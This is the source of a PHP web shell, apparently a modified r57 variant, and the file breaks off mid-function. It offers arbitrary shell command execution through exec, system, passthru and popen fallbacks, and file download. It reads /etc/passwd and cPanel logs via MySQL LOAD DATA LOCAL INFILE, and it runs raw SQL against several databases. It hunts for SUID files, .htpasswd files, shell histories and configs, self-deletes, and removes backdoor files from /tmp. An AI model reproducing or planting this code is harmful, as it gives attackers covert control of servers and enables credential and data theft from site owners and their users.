<?php

error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',1);
@ini_set('register_globals','1');
$safe_mode = @ini_get('safe_mode');
$version = "1.35";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=>$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }

$head = '<!-- M0d3d by Cyb3rPh03niX -->
<html>
<head>
<title>M0d3d by Cyb3rPh03niX</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
BORDER-COLOR: #333333;
color: #ffffff;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
BORDER-COLOR: #333333;
color: #ffffff;
}
.table1 {
BORDER: 0px;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #000000;
color: #ffffff;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: #ffffff;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #ffffff;
}
table {
BORDER:  #eeeeee 1px outset;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #000000;
color: #ffffff;
}
input {
border			: solid 1px;
border-color		: #2D2D2D #252525 #252525 #252525;
BACKGROUND-COLOR: #000000;
font: 8pt Verdana;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #000000;
font: 8pt Verdana;
color: #ffffff;;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: #000000;
width: 30%;
color: #ffffff;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #000000;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
SCROLLBAR-ARROW-COLOR: #ffffff;
SCROLLBAR-BASE-COLOR: #000000;
margin: 1px;
color: #ffffff;
background-color: #000000;
}
.main {
margin			: -287px 0px 0px -490px;
border			: #000000 solid 1px;
BORDER-COLOR: #333333;
}
.tt {
background-color: #252525;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>
';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } 
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } 
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            
        $fr   .= "\x00\x00";            
        $fr   .= "\x08\x00";            
        $fr   .= $hexdtime;             
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             
        $fr      .= pack('V', $c_len);           
        $fr      .= pack('V', $unc_len);         
        $fr      .= pack('v', strlen($name));    
        $fr      .= pack('v', 0);                
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x14\x00";                
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x08\x00";                
        $cdrec .= $hexdtime;                 
        $cdrec .= pack('V', $crc);           
        $cdrec .= pack('V', $c_len);         
        $cdrec .= pack('V', $unc_len);       
        $cdrec .= pack('v', strlen($name) ); 
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('V', 32 );            
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('V', strlen($ctrldir)) .           
            pack('V', strlen($data)) .              
            "\x00\x00";              
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress')) 
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     } 
     else if ($compress == 'gzip' && @function_exists('gzencode')) 
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     } 
     else if ($compress == 'zip' && @function_exists('gzcompress')) 
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     } 
     else 
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";	
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
if(isset($_GET['img'])&&!empty($_GET['img']))
 {
 $images = array();
 $images[1]='1';
 $images[2]='2';
 @ob_clean();
 header("Content-type: image/gif");
 echo base64_decode($images[$_GET['img']]);
 die();	
 } 
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { echo re($_POST['d_name']); $_POST['cmd']=""; }
  else 
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");   
    echo $filedump;
    exit();
   }		
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if ($_POST['cmd']=="db_query")
 {
  echo $head;
  switch($_POST['db'])
  {
  case 'MySQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
 $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mysql_select_db($_POST['mysql_db'],$db);
	$mdb=$_POST['mysql_db'];
	}

$mysql_files_str="/var/cpanel/accounting.log:/etc/passwd:/etc/httpd/conf/httpd.conf:/etc/proftpd.conf:/etc/hosts";
$mysql_files = explode(':', $mysql_files_str);


?>
        <script>
        var files = new Array();
        <? for($i=0;count($mysql_files)>$i;$i++) { ?>
        files[files.length] = "<?=$mysql_files[$i]?>";
        <? } ?>
        function setFile(bla) {
            for (var i=0;i < files.length;i++) {
                if (files[i]==bla.value) {
                    document.mysqlload.files.value = files[i];
                }
            }
        }
        </script>
<TABLE width=100% border=1><tr>
  <td width=100% bgcolor=#252525><font face=tahoma size=-2 color=#006633><b>Local Via MySQL by hCeGrOuP.NET ^($)^</b></font></td></tr>
  <tr align=center><td width=100% align=center>
  <form name="mysqlload"  method="POST">
	<?php
echo in('hidden','db',0,$_POST['db']).in('hidden','db_port',0,$_POST['db_port']).in('hidden','mysql_l',0,$_POST['mysql_l']).in('hidden','mysql_p',0,$_POST['mysql_p']).in('hidden','mysql_db',0,$_POST['mysql_db']).in('hidden','cmd',0,'db_query');
	?>
		<select name="deffile" onChange="setFile(this)">
            <? for ($i=0;count($mysql_files)>$i;$i++) { ?>
            <option value="<?=$mysql_files[$i]?>"<? if ($file==$mysql_files[$i]) { echo "selected"; } ?>><?
            $bla = explode('/', $mysql_files[$i]);
            $p = count($bla)-1;
            echo $bla[$p];
            ?></option>
            <? } ?>
            </select>
        <input type="text" name="files"  value="<?=$_POST['files']?>" size=80>
        <input type="submit" name="go" value="View"> <font size=2>
        </td>
        <?
if (!$_POST['files']) { $files = "/var/cpanel/accounting.log"; } else $files=$_POST['files'];
	$sql = array ('use '.$mdb,'CREATE TEMPORARY TABLE ' . ($tbl = 'R'.time()) . ' (a LONGBLOB)',

                                   "LOAD DATA LOCAL INFILE '$files' INTO TABLE $tbl FIELDS "
                                   . "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
                                   . "ESCAPED BY          '' "
                                   . "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

                                   "SELECT a FROM $tbl LIMIT 1"
                                );

                                foreach ($sql as $statement) {
                                   $q = mysql_query ($statement);

                                   if ($q == false) {
	   echo "<tr><td width=100%><font face=tahoma size=-2><b>&nbsp;<b><font face=tahoma size=-2 color=red>FAILED:</font> " . $statement . "\n"."&nbsp;</td></tr>";	
   	   echo "<tr><td width=100%><font face=tahoma size=-2><b>&nbsp;<b><font face=tahoma size=-2 color=red>REASON:</font>" . mysql_error () . "\n"."&nbsp;</b></font></td></tr></TABLE>";	
								   }
                                   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

                                   echo "<table border=100%><td align=center width=100% bgcolor=#252525><font face=tahoma size=-2><b>File :".$files."</a></font></td><tr><td width=100%>".htmlspecialchars($r[0])."</td></table>";
                                 }
			
$querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=tahoma size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mysql_query($query,$db);
      $error = @mysql_error($db);
      if($error) { echo "<table width=100%><tr><td align=left><font face=tahoma size=-2>Error : <b>".$error."</b></font></td></tr></table>"; }
      else {
      if (@mysql_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mysql_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td align=left bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td align=left><font face=tahoma size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td align=left><font face=tahoma size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td align=left bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table>";
       }
      else { if(($rows = @mysql_affected_rows($db))>=0) { echo "<table width=100%><tr><td align=left><font face=tahoma size=-2>affected rows : <b>".$rows."</b></font></td></tr></table>"; } }
      }
      @mysql_free_result($res);
      }
     }    
   	@mysql_close($db);
   }
  else echo "<div align=center><font face=tahoma size=-2 color=red><b>Can't connect to MySQL server</b></font></div>";  	
  break;
  case 'MSSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=tahoma size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mssql_query($query,$db);
      if (@mssql_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mssql_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=tahoma size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=tahoma size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
       else { if(($rows = @mssql_affected_rows($db)) > 0) { echo "<table width=100%><tr><td><font face=tahoma size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } else { echo "<table width=100%><tr><td><font face=tahoma size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }} 
      @mssql_free_result($res);
      }
     }    
   	@mssql_close($db);
   }
  else echo "<div align=center><font face=tahoma size=-2 color=red><b>Can't connect to MSSQL server</b></font></div>";
  break;
  case 'PostgreSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
   {
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=tahoma size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @pg_query($db,$query);
      $error = @pg_errormessage($db);
      if($error) { echo "<table width=100%><tr><td><font face=tahoma size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
      else {
      if (@pg_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @pg_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=tahoma size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=tahoma size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      else { if(($rows = @pg_affected_rows($res))>=0) { echo "<table width=100%><tr><td><font face=tahoma size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }
      }
      @pg_free_result($res);
      }
     }    
   	@pg_close($db);
   }
  else echo "<div align=center><font face=tahoma size=-2 color=red><b>Can't connect to PostgreSQL server</b></font></div>";
  break;
  case 'Oracle':
  $db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);
  if(($error = @ocierror())) { echo "<div align=center><font face=tahoma size=-2 color=red><b>Can't connect to Oracle server.<br>".$error['message']."</b></font></div>"; }
  else
   {
   $querys = @explode(';',$_POST['db_query']);
   foreach($querys as $num=>$query)
    { 
    if(strlen($query)>5) {
    echo "<font face=tahoma size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
    $stat = @ociparse($db, $query);
    @ociexecute($stat);
    if(($error = @ocierror())) { echo "<table width=100%><tr><td><font face=tahoma size=-2>Error : <b>".$error['message']."</b></font></td></tr></table><br>"; }
    else 
     {
     $rowcount = @ocirowcount($stat);
     if($rowcount != 0) {echo "<table width=100%><tr><td><font face=tahoma size=-2>affected rows : <b>".$rowcount."</b></font></td></tr></table><br>";}
     else {
     echo "<table width=100%><tr>";
     for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td bgcolor=#252525><font face=tahoma size=-2><b>&nbsp;".htmlspecialchars(@ocicolumnname($stat, $j))."&nbsp;</b></font></td>"; }
     echo "</tr>";
     while(ocifetch($stat))
      {
      echo "<tr>";
      for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td><font face=tahoma size=-2>&nbsp;".htmlspecialchars(@ociresult($stat, $j))."&nbsp;</font></td>"; }
      echo "</tr>";
      }
     echo "</table><br>";
     }
     @ocifreestatement($stat); 
     }
    }
    }
   @ocilogoff($db);
   }
  break;
  }
 echo "<form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; 
 echo "</form>";
 echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }	
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#252525><font face=tahoma size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#252525><font face=tahoma size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#252525><font face=tahoma size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.$key.'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=tahoma size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#252525><div align=center><font face=tahoma size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td align=center bgcolor=#252525><font face=tahoma size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table align=center width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td align=center bgcolor=#252525>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>?</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=tahoma size=-2>";
$ts = "<table align=center class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users'])) 
 { 
 if(!$users=get_users()) { echo "<center><font face=tahoma size=-2 color=red>Can\'t get users list</font></center>"; }
 else 
  { 
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); 
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 { 
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); } 
 if(empty($os)){ $os ="-"; $unix=1; } 
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=tahoma size=-2><b>".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=tahoma size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=tahoma size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=tahoma size=-2>Nothing :(</B></font></P>";
    }
  echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die(); 
  }                                                          
if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;	
  foreach ($rows as $string)
   {
   	$user = @explode(":",$string);
   	if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users; 	
}
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ???????? ? ???? '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ????????? ???? '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "?? ??????? ??????? "; }
else { $text = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#252525><font color=red face=tahoma size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function fe($l,$n)
{
$text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ?????????? ?? ftp ???????');
$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\'t change dir on ftp server');	
